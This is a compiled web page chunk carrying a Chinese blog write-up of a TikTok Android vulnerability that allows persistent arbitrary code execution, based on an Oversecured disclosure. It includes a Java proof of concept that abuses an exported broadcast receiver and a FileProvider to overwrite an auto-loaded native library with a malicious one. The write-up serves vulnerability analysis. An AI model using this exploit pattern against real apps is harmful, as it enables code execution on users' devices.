import{_ as s,c as a,o as n,N as l}from"./chunks/framework.3a9190c5.js";const C=JSON.parse('{"title":"Tiktok持久任意代码执行漏洞","description":"","frontmatter":{"title":"Tiktok持久任意代码执行漏洞","date":"2022-01-14T13:57:03.000Z","hide":false,"tags":["security","app","android","tiktok"],"categories":["技术相关"]},"headers":[],"relativePath":"app_security/tiktok_arbitrary_code_execution.md"}'),o={name:"app_security/tiktok_arbitrary_code_execution.md"},p=l(`<h1 id="tiktok持久任意代码执行漏洞" tabindex="-1">Tiktok持久任意代码执行漏洞 <a class="header-anchor" href="#tiktok持久任意代码执行漏洞" aria-label="Permalink to &quot;Tiktok持久任意代码执行漏洞&quot;">​</a></h1><h2 id="持久ce的前提" tabindex="-1">持久CE的前提 <a class="header-anchor" href="#持久ce的前提" aria-label="Permalink to &quot;持久CE的前提&quot;">​</a></h2><p>想要实现持久的CE,就必须能够覆盖app自动加载的so文件,而titok的这个漏洞就满足这个要求:</p><ol><li>tiktok 会从指定目录加载so文件</li><li>存在外部读写该目录的漏洞</li></ol><h2 id="任意文件读写的漏洞" tabindex="-1">任意文件读写的漏洞 <a class="header-anchor" href="#任意文件读写的漏洞" aria-label="Permalink to &quot;任意文件读写的漏洞&quot;">​</a></h2><h3 id="notificationbroadcastreceiver" tabindex="-1">NotificationBroadcastReceiver <a class="header-anchor" href="#notificationbroadcastreceiver" aria-label="Permalink to &quot;NotificationBroadcastReceiver&quot;">​</a></h3><p>这个导出组件存在<a href="./android_howto_protected_unexported_components.html">如何保护导出组件</a>一文描述的可以访问启动内部未导出组件的漏洞.</p><p><img alt="" data-src="img/tiktok_notification_broadcast_receiver_manfiest.png.png" loading="lazy" class="lazy"><img alt="" data-src="img/tiktok_broadcast_receiver.png" loading="lazy" class="lazy"></p><p>同时还存在着未导出的FileProvider,可以对外提供任意文件读写的服务.</p><h4 id="fileprovider" tabindex="-1">FileProvider <a class="header-anchor" href="#fileprovider" aria-label="Permalink to &quot;FileProvider&quot;">​</a></h4><div class="language-xml line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">provider</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">android.support.v4.content.FileProvider</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">exported</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">false</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">authorities</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.zhiliaoapp.musically.fileprovider</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">grantUriPermissions</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">true</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">&lt;</span><span style="color:#F07178;">meta-data</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">name</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">android.support.FILE_PROVIDER_PATHS</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;"> </span><span style="color:#C792EA;">android</span><span style="color:#89DDFF;">:</span><span style="color:#C792EA;">resource</span><span style="color:#89DDFF;">=</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">@xml/k86</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">/&gt;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">&lt;/</span><span style="color:#F07178;">provider</span><span style="color:#89DDFF;">&gt;</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>可以看到<a href="./android_howto_protected_unexported_components.html">如何保护导出组件</a>提到的关键标志: <code>android:grantUriPermissions=&quot;true&quot;</code>. 因此也就意味着tiktok发出的Intent中只要带有<code>Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code>标志,接收者就自动获得了相关文件的读写权限.</p><h3 id="是否有自动加载so文件地方呢" tabindex="-1">是否有自动加载so文件地方呢? <a class="header-anchor" href="#是否有自动加载so文件地方呢" aria-label="Permalink to &quot;是否有自动加载so文件地方呢?&quot;">​</a></h3><p>经过排查,发现确实存在着的地方 <img alt="" data-src="img/load_so1.png.png" loading="lazy" class="lazy"> 经过测试,选定<code>/data/user/0/com.zhiliaoapp.musically/app_librarian/14.7.5.6172264464/libAkeva.so</code>,覆盖这个so文件的好处:</p><ol><li>会自动被加载</li><li>这个文件几乎不被使用,所以不影响tiktok的正常运行.</li></ol><h2 id="完整的poc" tabindex="-1">完整的poc <a class="header-anchor" href="#完整的poc" aria-label="Permalink to &quot;完整的poc&quot;">​</a></h2><div class="language-java line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">protected</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">void</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">onCreate</span><span style="color:#89DDFF;">(</span><span style="color:#C792EA;">Bundle</span><span style="color:#A6ACCD;"> savedInstanceState</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">        super</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">onCreate</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">savedInstanceState</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#82AAFF;">handleIntent</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">getIntent</span><span style="color:#89DDFF;">());</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">protected</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">void</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">onNewIntent</span><span style="color:#89DDFF;">(</span><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> intent</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">        super</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">onNewIntent</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#82AAFF;">handleIntent</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">private</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">void</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">handleIntent</span><span style="color:#89DDFF;">(</span><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> i</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#89DDFF;">(!</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">evil</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">equals</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">i</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getAction</span><span style="color:#89DDFF;">()))</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> next </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Intent</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">evil</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">            next</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setClassName</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">getPackageName</span><span style="color:#89DDFF;">(),</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">getClass</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">getCanonicalName</span><span style="color:#89DDFF;">());</span></span>
<span class="line"><span style="color:#A6ACCD;">            next</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setFlags</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">Intent</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">FLAG_GRANT_PERSISTABLE_URI_PERMISSION </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> Intent</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">FLAG_GRANT_WRITE_URI_PERMISSION</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">            next</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setData</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">Uri</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">content://com.zhiliaoapp.musically.fileprovider/name/data/user/0/com.zhiliaoapp.musically/lib-main/libimagepipeline.so</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">));</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#C792EA;">Intent</span><span style="color:#A6ACCD;"> intent </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Intent</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">notification_clicked</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">            intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">setClassName</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.zhiliaoapp.musically</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">com.ss.android.ugc.awemepushlib.os.receiver.NotificationBroadcastReceiver</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">            intent</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">putExtra</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">contentIntentURI</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> next</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#82AAFF;">sendBroadcast</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">intent</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">else</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;font-style:italic;">try</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">                </span><span style="color:#C792EA;">OutputStream</span><span style="color:#A6ACCD;"> o </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">getContentResolver</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">openOutputStream</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">i</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getData</span><span style="color:#89DDFF;">());</span></span>
<span class="line"><span style="color:#A6ACCD;">                </span><span style="color:#C792EA;">InputStream</span><span style="color:#A6ACCD;"> in </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">getimg</span><span style="color:#89DDFF;">().</span><span style="color:#82AAFF;">open</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">evil_lib.so</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">                IOUtils</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">copy</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">in</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> o</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">                inp</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">close</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">                o</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">close</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;font-style:italic;">catch</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#C792EA;">Throwable</span><span style="color:#A6ACCD;"> </span><span style="color:#A6ACCD;font-style:italic;">th</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">                </span><span style="color:#89DDFF;font-style:italic;">throw</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">RuntimeException</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">th</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><p>poc 的思路也很巧妙,发送Intent给<code>NotificationBroadcastReceiver</code>,然后<code>NotificationBroadcastReceiver</code>通过<code>startActivity</code>又把<code>next</code>传送给了自己,从而获得<code>/user/0/com.zhiliaoapp.musically/lib-main/libimagepipeline.so</code>的读写权限.</p><h2 id="另一个持久ce的漏洞" tabindex="-1">另一个持久CE的漏洞 <a class="header-anchor" href="#另一个持久ce的漏洞" aria-label="Permalink to &quot;另一个持久CE的漏洞&quot;">​</a></h2><p>和上面通过<code>NotificationBroadcastReceiver</code>获得文件读写权限类似,这次是通过<code>DetailActivity</code>来实现,他也是一个导出的组件,同时没有对收到的Intent进行检查,就进行了转发.</p><p><img alt="" data-src="img/detail_activity.png" loading="lazy" class="lazy"></p><p>至于poc则几乎和上面的完全一致,所以就不重复了.</p><p>参考文档: <a href="https://blog.oversecured.com/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/" target="_blank" rel="noreferrer">Oversecured detects dangerous vulnerabilities in the TikTok Android app</a></p>`,23),e=[p];function t(r,c,D,i,F,y){return n(),a("div",null,e)}const d=s(o,[["render",t]]);export{C as __pageData,d as default};